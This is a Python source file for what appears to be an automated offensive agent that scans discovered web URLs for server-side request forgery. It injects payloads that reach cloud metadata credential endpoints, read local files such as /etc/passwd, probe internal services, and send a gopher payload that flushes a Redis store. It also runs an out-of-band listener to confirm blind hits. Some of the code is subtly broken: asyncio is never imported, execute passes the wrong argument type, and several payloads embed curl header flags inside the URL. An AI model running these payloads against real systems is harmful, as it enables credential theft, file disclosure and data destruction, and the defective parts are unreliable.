from core.data_models import Strategy, SSRFReport, SSRFFinding, AttackPhase, ErrorType
from core.data_models import AgentData, Strategy
from core.logger import log
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import json
import os
import time

from core.base_agent import BaseAgent


class SSRFAgent(BaseAgent):
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD]
    required_tools = ["curl"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.report_class = SSRFReport

    async def get_payloads(self, listener_url: str) -> dict:
        """Returns a dictionary of SSRF payloads, including bypass techniques."""
        attacker_ip = await self.context_manager.get_context('attacker_ip')
        return {
            "blind": [
                listener_url,
                # DNS Rebinding
                f"http://{attacker_ip}.nip.io/",
            ],
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://[::ffff:a9fe:a9fe]/latest/meta-data/",  # IPv6 Bypass
                "http://instance-data/latest/meta-data/",  # Alternative DNS
            ],
            "gcp": [
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://169.254.169.254/computeMetadata/v1/ -H 'Metadata-Flavor: Google'",  # Header required
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H 'Metadata: true'"
            ],
            "internal_file": [
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
                "file:////etc/passwd",
            ],
            "internal_network": [
                "http://localhost/server-status",
                "http://127.0.0.0:8080",
                "http://[::1]:22",  # IPv6 localhost
                "dict://localhost:11211/stats",  # Memcached
                "gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",  # Redis flush
            ]
        }

    async def _test_url_for_ssrf(self, target_url: str, payloads: dict, report: SSRFReport):
        log.info(f"Testing {target_url} for SSRF...")
        parsed_url = urlparse(target_url)
        original_params = parse_qs(parsed_url.query)

        if not original_params:
            return

        for param_name in original_params:
            for category, payload_list in payloads.items():
                for payload in payload_list:
                    # Create a mutable copy of the params
                    params_copy = original_params.copy()
                    params_copy[param_name] = [payload]
                    new_query = urlencode(params_copy, doseq=True)
                    test_url = urlunparse(parsed_url._replace(query=new_query))

                    # Use curl via run_shell_command for the request
                    command = f'curl -s -L -m 10 "{test_url}"'
                    result = await self.orchestrator.run_shell_command(
                        command, f"Testing SSRF on {param_name} with payload {payload}", use_proxy=True)

                    if result and result.get('exit_code') == 0:
                        response_body = result.get('stdout', '')
                        # Check for in-band SSRF signatures
                        if category == "aws" and ("instance-id" in response_body or "ami-id" in response_body):
                            log.warning(
                                f"Potential AWS Metadata exposure found at {target_url} with param {param_name}")
                            report.findings.append(SSRFFinding(vulnerable_url=target_url, payload=payload,
                                                   description=f"In-band AWS metadata exposure via parameter '{param_name}'.", response_body=response_body[:500]))
                        elif category == "gcp" and "instance/" in response_body:
                            log.warning(
                                f"Potential GCP Metadata exposure found at {target_url} with param {param_name}")
                            report.findings.append(SSRFFinding(vulnerable_url=target_url, payload=payload,
                                                   description=f"In-band GCP metadata exposure via parameter '{param_name}'.", response_body=response_body[:500]))
                        elif payload.startswith("file://") and ("root:x:0:0" in response_body or "[fonts]" in response_body):
                            log.warning(
                                f"Potential LFI via SSRF found at {target_url} with param {param_name}")
                            report.findings.append(SSRFFinding(vulnerable_url=target_url, payload=payload,
                                                   description=f"Local File Inclusion via SSRF on parameter '{param_name}'.", response_body=response_body[:500]))

    async def _check_blind_interactions(self, listener_id: str, log_file: str, report: SSRFReport):
        log.info(
            f"Checking for blind SSRF interactions on listener {listener_id}...")
        if not os.path.exists(log_file):
            log.info("Listener log file not found.")
            return

        with open(log_file, "r") as f:
            for line in f:
                try:
                    interaction = json.loads(line)
                    # Correlate the interaction with a target
                    # This is a simple correlation, a more advanced system could use unique URLs per target
                    details = f"Blind SSRF confirmed. Received a {interaction['method']} request from {interaction['client_address']} to {interaction['path']} on our listener."
                    log.warning(details)
                    # Since we don't know which URL triggered it, we report it generically
                    report.findings.append(SSRFFinding(
                        vulnerable_url="Unknown (Blind)", payload=f"listener_id: {listener_id}", description=details, response_body=json.dumps(interaction)))
                except json.JSONDecodeError:
                    continue

    async def run(self, strategy: Strategy, **kwargs) -> SSRFReport:
        start_time = time.time()
        log.phase("SSRF Agent: Starting advanced SSRF scan...")
        report = SSRFReport(
            agent_name=self.__class__.__name__,
            start_time=start_time
        )
        listener_info = None

        try:
            # Start a listener for blind SSRF
            listener_info = await self.orchestrator.start_temporary_listener()
            if not listener_info or listener_info.get("status") != "success":
                error_msg = "Failed to start temporary listener. Blind SSRF checks will be skipped."
                log.error(error_msg)
                listener_url = "localhost:8000"  # Fallback
                report.errors.append(error_msg)
                report.error_type = ErrorType.NETWORK
            else:
                listener_url = listener_info["public_url"]

            payloads = await self.get_payloads(listener_url)

            # Get targets from recon data
            recon_data = await self.context_manager.get_context('recon_data')
            if not recon_data or not recon_data.http_servers:
                summary = "No HTTP servers found to test for SSRF."
                log.warning(summary)
                report.summary = summary
                report.errors.append("Reconnaissance data missing or no HTTP servers found.")
                report.error_type = ErrorType.CONFIGURATION
                report.end_time = time.time()
                return report

            targets = [
                url for url in recon_data.http_servers if urlparse(url).query]
            if not targets:
                log.info("No URLs with query parameters found to test for SSRF.")
                # Test first 5 as a fallback
                targets = recon_data.http_servers[:5]

            for url in targets[:10]:  # Limit scans
                await self._test_url_for_ssrf(url, payloads, report)

            # Check for out-of-band interactions
            if listener_info and listener_info.get("status") == "success":
                await self._check_blind_interactions(
                    listener_info["listener_id"], listener_info["log_file"], report)

        except Exception as e:
            error_msg = f"An unexpected error occurred during SSRF scan: {e}"
            log.error(error_msg, exc_info=True)
            report.errors.append(error_msg)
            report.error_type = ErrorType.LOGIC
            report.summary = error_msg
        finally:
            if listener_info and listener_info.get("status") == "success":
                await self.orchestrator.stop_temporary_listener(
                    listener_info["listener_id"])

        if report.findings:
            report.summary = f"Found {len(report.findings)} potential SSRF vulnerabilities."
        else:
            report.summary = "No SSRF vulnerabilities found."

        log.success(report.summary)
        report.end_time = time.time()
        return report

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute ssrf agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )
